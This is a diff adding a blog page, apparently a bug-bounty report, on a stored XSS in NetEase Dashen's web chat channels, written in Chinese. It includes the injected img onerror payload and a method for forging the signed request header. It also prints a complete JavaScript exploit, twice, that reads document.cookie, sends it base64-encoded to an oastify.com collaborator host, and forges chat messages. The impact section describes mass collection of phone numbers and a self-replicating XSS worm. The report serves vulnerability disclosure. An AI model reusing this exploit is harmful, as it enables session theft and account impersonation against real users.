@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>中危：网易大神Web端频道签到消息存储型XSS漏洞 | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="中危：网易大神Web端频道签到消息存储型XSS漏洞" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html" />
+<meta property="og:url" content="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-19T10:26:18+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="中危：网易大神Web端频道签到消息存储型XSS漏洞" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-10-19T10:26:18+08:00","datePublished":"2023-10-19T10:26:18+08:00","description":"Name","headline":"中危：网易大神Web端频道签到消息存储型XSS漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/xss/2023/10/19/xss-innerhtml.html"},"url":"http://localhost:4000/xss/2023/10/19/xss-innerhtml.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">中危：网易大神Web端频道签到消息存储型XSS漏洞</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-10-19T10:26:18+08:00" itemprop="datePublished">Oct 19, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易大神Web端频道签到消息存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg</li>
+  <li>POC网页 https://ds.163.com/channel/0149881854/1459481/ 打开后在终端打印111222233</li>
+  <li>视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /v1/web/chat-room-msg/send-msg HTTP/1.1
+Host: inf-im.ds.163.com
+Connection: close
+Content-Length: 586
+GL-CheckSum: 20c428fbe325f20d1ff139943dafd2334814804e_28aebbff3e33281f4afe3ebcf0b19ae90ba97998
+sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+sec-ch-ua-mobile: ?0
+GL-Uid: xxxxxxx
+GL-DeviceId: 1189888043.1694780319
+Content-Type: application/json;charset=UTF-8
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+GL-ClientType: 61
+GL-Nonce: xxxx
+GL-X-XSRF-TOKEN: xxxxx
+sec-ch-ua-platform: "Windows"
+Origin: https://ds.163.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ds.163.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cookie: xxx
+
+{ "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(2222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>网易大神web版中，聊天频道发布签到消息(IMAGE_TEXT_TEMPLATE)时，没有对签到的内容进行过滤，而是直接将签到内容赋值给innerHTML，直接造成存储型XSS攻击。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>登录大神Web平台 https://ds.163.com/</li>
+  <li>
+    <p>进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
+发消息测试，并且通过burpsuite观察请求包结构</p>
+
+    <p><img src="/assets/images/sendmsg.png" alt="sendmsg" /></p>
+
+    <p>可以从请求头header中看到，前端对请求体做了校验，攻击者直接修改请求体是不可行的
+ <img src="/assets/images/checksum.png" alt="checksum" /></p>
+  </li>
+  <li>
+    <p>为了绕过校验，对前端的校验流程进行简单的逆行分析定位到校验函数，并且成功获取函数handler。
+ https://g.166.net/res/a19/umi.b2e4db33.js 中的gen_sign函数对原始的请求体进行了校验并且返回校验的结果，如下：
+ <img src="/assets/images/sign.png" alt="sign" />
+ 继续分析，发现gen_sign函数来源于https://g.166.net/opd/latest/sig/bootstrap.js的sig模块，通过sig.default()能够初始化并且返回模块，从而获取到gen_sign函数handler
+ <img src="/assets/images/module.png" alt="module" />
+ 测试对请求体进行校验：
+ <img src="/assets/images/gensign.png" alt="gensign" /></p>
+  </li>
+  <li>至此，我们能够对请求体进行篡改并且带上合法的校验头。通过debug发现签到消息直接渲染到了前端没有进行过滤。这点是通过untrusted type chrome插件定位的。</li>
+  <li>
+    <p>而签到消息的结构体可以从消息获取请求中得到，如下图。获取结构体后，我们便可以构造xss payload，并且发送该消息。</p>
+
+    <p><img src="/assets/images/qiandaotype.png" alt="qiandaotype" /></p>
+
+    <p>由此构造最终的xss payload，其中serverID，channelID，squareID分别是频道相关的id号，表示需要把消息发送给哪个聊天群。fromUid是消息发送者的id，content.data字段便是xss的注入点位, contentType务必填写IMAGE_TEXT_TEMPLATE类型：</p>
+
+    <p>{ “serverId”: “0149881854”, “channelId”: “1459481”, “squareId”: “60054a7dd5456877d226706e”, “fromUid”: “b1fbb501020c46ff88577a3fe103c0ec”, “fromNick”: “”, “msgType”: “CHAT_ROOM_MSG”, “sourceType”: “GOD_WEB”, “content”: [{ “type”: “TITLE”, “data”: { “banner”: “”, “icon”: “https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870”, “atUser”: “@灯中烛火”, “text”: “签到成功！” }, “order”: 0.0 }, { “type”: “TEXT”, “data”: “&lt;img src=x onerror=console.log(1111122222233)&gt;”, “order”: 1.0 }, { “type”: “BUTTON”, “data”: [{ “text”: “立即抽奖”, “action”: { “type”: “OPEN_URL”, “data”: “https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+” } }], “order”: 2.0 }], “contentType”: “IMAGE_TEXT_TEMPLATE” }</p>
+
+    <p>为简化操作，写一个js文件，实现自动发帖，将上述payload通过本js脚本发送，请在大神网页的Console中执行。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
+ const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+ // init webassembly and get sig_gen function
+ // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+ var moduleX;
+ Promise.all([sig.default()]).then(function (t) {
+     moduleX = t
+ })
+
+ // 获取cookie信息
+ const getCookieValue = (name) =&gt; (
+     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+ )
+
+ const myFetch = async (url, headers) =&gt; {
+     let data = await fetch(url, {
+         method: 'GET',
+         headers: headers,
+         credentials: 'include'
+     })
+     let res = await data.json();
+     return res
+ }
+ // 构造GET发送请求
+ const setHeaderDs = (payload) =&gt; {
+     var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+     var GL_Uid = getCookieValue('GOD_UUID')
+     var checkres = moduleX['0'].gen_sign(payload)
+     var checkjson = JSON.parse(checkres)
+     var GL_CheckSum = checkjson['sign']
+     var GL_Nonce = checkjson['timestamp']
+     var GL_ClientType = 61
+     var GL_DeviceId = localStorage.getItem('ns-client-id')
+     var headers = {
+         'GL-CheckSum': GL_CheckSum,
+         'GL-Nonce': GL_Nonce,
+         'GL-Uid': GL_Uid,
+         'GL-DeviceId': GL_DeviceId,
+         'GL-ClientType': GL_ClientType,
+         'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+         'Content-Type': 'application/json;charset=UTF-8'
+     }
+     return headers
+ }
+
+ // 构造POST发送请求
+ const myPostFetch = async (url, headers, payload) =&gt; {
+     let data = await fetch(url, {
+         method: 'POST',
+         headers: headers,
+         credentials: 'include',
+         body: JSON.stringify(payload),
+     })
+     let res = await data.json();
+     return res
+ }
+
+ // 通过img src来向burpsuite collaborator url外送敏感新信息
+ const justSend = async url =&gt; {
+     var Img = new Image
+     Img.src = url
+ }
+
+ // base64 加解密
+ const encode = str =&gt; {
+     var b64 = btoa(unescape(encodeURIComponent(str)))
+     return b64
+ }
+ const decode = str =&gt; {
+     var str = decodeURIComponent(escape(atob(str)));
+     return str
+ }
+ //获取并发送cookie，带有手机号
+ const sendCookie = () =&gt; {
+     var encoded = encode(document.cookie)
+     // send data
+     justSend(api_burp + '?data=' + encoded)
+ }
+
+ // 发送xss payload
+ const startSendLinkMessage = async function () {
+
+     // 链接，设置fromUid为攻击者的UID
+     var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+
+     var headers = setHeaderDs(JSON.stringify(payload_json))
+     res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+ }
+ startSendLinkMessage()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>结果展示
+ payload已经渲染到前端</p>
+
+    <p><img src="/assets/images/consolelog.png" alt="consolelog" />
+ payload已经执行：</p>
+
+    <p><img src="/assets/images/consolelog2.png" alt="consolelog2" /></p>
+  </li>
+  <li>该XSS的利用</li>
+</ol>
+
+<ul>
+  <li>首先是窃取cookie，可能会带有邮箱和手机号信息
+<a href="/assets/images/cookie.png">cookie</a></li>
+  <li>伪造发送消息等
+前面通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。</li>
+</ul>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频
+视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314
+完整利用脚本如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // burpsuite collaborator url
+    const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+    // init webassembly and get sig_gen function
+    // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+    var moduleX;
+    Promise.all([sig.default()]).then(function (t) {
+        moduleX = t
+    })
+
+    // 获取cookie信息
+    const getCookieValue = (name) =&gt; (
+        document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+    )
+
+    const myFetch = async (url, headers) =&gt; {
+        let data = await fetch(url, {
+            method: 'GET',
+            headers: headers,
+            credentials: 'include'
+        })
+        let res = await data.json();
+        return res
+    }
+    // 构造GET发送请求
+    const setHeaderDs = (payload) =&gt; {
+        var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+        var GL_Uid = getCookieValue('GOD_UUID')
+        var checkres = moduleX['0'].gen_sign(payload)
+        var checkjson = JSON.parse(checkres)
+        var GL_CheckSum = checkjson['sign']
+        var GL_Nonce = checkjson['timestamp']
+        var GL_ClientType = 61
+        var GL_DeviceId = localStorage.getItem('ns-client-id')
+        var headers = {
+            'GL-CheckSum': GL_CheckSum,
+            'GL-Nonce': GL_Nonce,
+            'GL-Uid': GL_Uid,
+            'GL-DeviceId': GL_DeviceId,
+            'GL-ClientType': GL_ClientType,
+            'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+            'Content-Type': 'application/json;charset=UTF-8'
+        }
+        return headers
+    }
+
+    // 构造POST发送请求
+    const myPostFetch = async (url, headers, payload) =&gt; {
+        let data = await fetch(url, {
+            method: 'POST',
+            headers: headers,
+            credentials: 'include',
+            body: JSON.stringify(payload),
+        })
+        let res = await data.json();
+        return res
+    }
+
+    // 通过img src来向burpsuite collaborator url外送敏感新信息
+    const justSend = async url =&gt; {
+        var Img = new Image
+        Img.src = url
+    }
+
+    // base64 加解密
+    const encode = str =&gt; {
+        var b64 = btoa(unescape(encodeURIComponent(str)))
+        return b64
+    }
+    const decode = str =&gt; {
+        var str = decodeURIComponent(escape(atob(str)));
+        return str
+    }
+    //获取并发送cookie，可能带有手机号
+    const sendCookie = () =&gt; {
+        var encoded = encode(document.cookie)
+        // send data
+        justSend(api_burp + '?data=' + encoded)
+    }
+
+    // 发送xss payload
+    const startSendLinkMessage = async function () {
+
+        // 链接，设置fromUid为攻击者的UID
+        var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+
+        var headers = setHeaderDs(JSON.stringify(payload_json))
+        res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+    }
+    // 判断pc端还是手机端
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile) {
+        /* your code here */
+    } else {
+        //web端
+        //发送cookie
+        sendCookie()
+        //伪造发分享消息
+        startSendLinkMessage()
+    }
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+<p>该漏洞影响网页端所有聊天频道，注意到每个游戏频道都有几十上百万用户，影响深远。用户只要进入聊天界面，无需任何操作就能够遭受攻击。</p>
+<ol>
+  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；</li>
+  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。</li>
+</ol>
+
+<h2 id="patch-advice">Patch advice</h2>
+<ol>
+  <li>对签到的内容进行过滤，而非直接复杂给innerHTML</li>
+</ol>
+
+
+  </div><a class="u-url" href="/xss/2023/10/19/xss-innerhtml.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
